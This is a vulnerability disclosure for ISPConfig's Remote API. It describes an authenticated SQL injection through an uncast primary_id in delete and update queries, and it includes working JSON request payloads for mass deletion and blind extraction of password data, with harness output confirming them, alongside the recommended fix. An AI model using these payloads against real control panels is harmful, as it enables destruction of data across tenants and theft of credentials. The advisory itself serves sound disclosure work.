https://git.ispconfig.org/ispconfig/ispconfig3

## Title: Authenticated SQL injection in the Remote API via uncast primary_id (getDeleteSQL)

### Affected Versions: confirmed on develop commit c84a1bd (3.3dev, post-3.3.1p1); the vulnerable code is long-standing in 3.2.x/3.3.x

### Summary
Every `*_delete` (and `*_update`) method of the ISPConfig Remote SOAP/JSON API passes the caller-supplied `primary_id` parameter into the SQL WHERE clause without casting it to an integer or binding it as a placeholder. A remote API user holding any single low-privilege function permission (for example `dns_a_delete`) can inject arbitrary SQL into the resulting `DELETE FROM ... WHERE id = <primary_id> ...` query. This permits arbitrary cross-tenant DELETE/UPDATE across the entire control-panel database and blind boolean extraction of any table (including `remote_user.remote_password`, `client` records, and `sys_user.passwort` hashes). The built-in SQL injection scanner does not stop quote-free boolean payloads, and in its default `warn` mode it does not block requests at all.

### Details

Injectable sink, `interface/lib/classes/remoting_lib.inc.php:236`:

```php
function getDeleteSQL($primary_id) {
    if(stristr($this->formDef['db_table'], '.')) { $escape = ''; }
    else { $escape = '`'; }
    $sql = "DELETE FROM ".$escape.$this->formDef['db_table'].$escape." WHERE ".$this->formDef['db_table_idx']." = ".$primary_id. " AND " . $this->getAuthSQL('d', $this->formDef['db_table']);
    return $sql;
}
```

`$primary_id` is concatenated raw. There is no `intval()`, no quoting, and no `?` placeholder.

It is executed with a single-argument `query()` call, `interface/lib/classes/remoting.inc.php:486`:

```php
protected function deleteQuery($formdef_file, $primary_id, $event_identifier = '') {
    ...
    $old_rec = $app->remoting_lib->getDataRecord($primary_id);   // does NOT abort on a non-numeric string
    ...
    $sql = $app->remoting_lib->getDeleteSQL($primary_id);
    $app->db->query($sql);                                        // single arg -> no placeholder substitution
```

Because `query($sql)` is invoked with one argument, `_build_query_string` (`interface/lib/classes/db_mysql.inc.php:150`) skips its entire substitution block (`if($iArgs > 1) { ... }`) and returns the string verbatim. The string is then handed to `mysqli_query` unchanged (`db_mysql.inc.php:333`).

The numeric pre-check does not save it. In `getDataRecord` (`remoting_lib.inc.php:248`), a value such as `"0 OR 1=1"` is not numeric and not an array/object, so the method simply returns `array()` without throwing, and `deleteQuery` proceeds to `getDeleteSQL($primary_id)` with the same raw string.

Reachability. Every public delete method forwards the attacker-controlled `primary_id` unchanged, for example `interface/lib/classes/remote.d/dns.inc.php`:

```php
public function dns_a_delete($session_id, $primary_id, $update_serial=false) {   // line 302
    return $this->dns_rr_delete($session_id, $primary_id, $update_serial, 'A');
}
private function dns_rr_delete($session_id, $primary_id, $update_serial=false, $rr_type='A') {  // line 247
    if(!$this->checkPerm($session_id, 'dns_'.$rr_type.'_delete')) { ... }       // only requires dns_A_delete
    $affected_rows = $this->deleteQuery('../dns/form/dns_'.$rr_type.'.tform.php', $primary_id);  // line 258
```

The JSON handler maps the request field straight into the positional argument with no coercion, `interface/lib/classes/json_handler.inc.php:71`:

```php
foreach($methObj->getParameters() as $param) {
    $pname = $param->name;
    if(isset($json[$pname])) $params[] = $json[$pname];   // a JSON string "0 OR 1=1" stays a PHP string
    ...
}
call_user_func_array(array($this->classes[$class_name], $method), $params);
```

The same uncast pattern affects the UPDATE path: `getSQL` -> `_getSQL` builds `UPDATE ... WHERE <idx> = ".$primary_id` at `interface/lib/classes/tform_base.inc.php:1489` and `:1497`, reached via `updateQuery` with the caller's `primary_id`.

Authorization context. A remote_user authenticates with `remote_username`/`remote_password` (`remoting.inc.php:157`) and is granted a list of allowed functions by the admin. The attacker only needs one delete/update function; they do not need admin scope. For a remote_user, `loadUserProfile(0)` forces `typ='admin'`, so `getAuthSQL('d')` returns `'1'`, and the injected `OR` reaches every row in the table.

The IDS does not stop it. `securityScan` (`db_mysql.inc.php:221`) blocks only `; # /* */ -- \' \"` and unbalanced quotes/backticks. A quote-free boolean such as `0 OR 1=1` or `1 AND (SELECT SUBSTRING(token,1,1) FROM secret_tbl LIMIT 1)='S'` contains none of those and keeps quotes balanced, so it passes. The shipped defaults are `sql_scan_enabled=yes` and `sql_scan_action=warn` (`install/tpl/security_settings.ini.master`); in `warn` mode a flagged query merely returns false, it does not block the request.

Contrast with the safe siblings. The SELECT read path uses placeholders (`getDataRecord` -> `parent::getDataRecord(intval($primary_id))`, and `SELECT * FROM ??`). The INSERT path and the `_primary_id` override in `getSQL` (`remoting_lib.inc.php:224`) apply `intval()`. Only `getDeleteSQL` (and the `_getSQL` UPDATE branch) were never converted to a placeholder or integer cast.

### PoC

Prerequisites: a remote API user (created by the admin under System > Remote Users) that has the `DNS a` function enabled, or any other `*_delete`/`*_update` function. The Remote API must be enabled (default). No admin privileges are required.

JSON API request (the `primary_id` carries the payload):

```
POST /remote/json.php?login HTTP/1.1
Content-Type: application/json

{"username":"apiuser","password":"apipass"}
```

```
POST /remote/json.php?dns_a_delete HTTP/1.1
Content-Type: application/json

{"session_id":"<session from login>","primary_id":"0 OR 1=1"}
```

The server builds and runs:

```
DELETE FROM `dns_rr` WHERE id = 0 OR 1=1 AND 1
```

which deletes every DNS record of every client. Blind data extraction uses a sub-select whose truth deletes (or not) a row the attacker can observe through the returned `affected_rows`:

```
{"session_id":"<session>","primary_id":"1 AND (SELECT SUBSTRING(remote_password,1,1) FROM remote_user LIMIT 1)='$'"}
```

validated run against the unmodified ISPConfig classes (interface/lib/classes/{db_mysql,remoting_lib,tform_base}.inc.php) and a MariaDB, with the default IDS settings:

```
=== ISPConfig remote-API getDeleteSQL SQLi - live harness ===
PHP 8.3.31  DB=ispc-sqli-test
IDS config: sql_scan_enabled=yes, sql_scan_action=warn (defaults)

[before] dns_rr rows: 1:attacker.com(grp2)  2:victimB.com(grp3)  3:victimC.com(grp4)

[getDeleteSQL output] (verbatim method):
  DELETE FROM `dns_rr` WHERE id = 0 OR 1=1 AND 1

[executing via db->query() - exercises securityScan + escape]
  query() returned: true   affectedRows = 3
  db->errorMessage: ''

[after]  dns_rr rows: 

>>> CONFIRMED: payload '0 OR 1=1' bypassed the id= predicate and the IDS scan,
>>> deleting ALL tenants' DNS records via a single low-priv dns_a_delete call.

[blind-read getDeleteSQL output]:
  DELETE FROM `probe` WHERE id = 1 AND (SELECT SUBSTRING(token,1,1) FROM secret_tbl LIMIT 1)='S' AND 1
  probe rows before=1 after=0
>>> CONFIRMED blind-read oracle: row deleted => secret token starts with 'S' (data exfil via affectedRows).
```

### Impact

Authenticated SQL injection (CWE-89). Any Remote API user holding a single low-privilege delete or update function can:

- delete or modify arbitrary rows across every tenant (DNS zones and records, mailboxes, mail domains, websites, databases, FTP users, clients), causing cross-account data loss and service disruption;
- extract any data in the database via blind boolean injection observed through the returned `affected_rows`, including the password hashes of other remote users, client records, and panel user password hashes.

Remote API users are routinely provisioned with narrow scopes for third-party integrations and reseller automation, so this turns a deliberately limited integration credential into full read/write access over the entire control panel database. The fix is to cast `$primary_id` with `intval()` (or bind it as a `?` placeholder) in `getDeleteSQL` and in the `_getSQL` UPDATE branch.
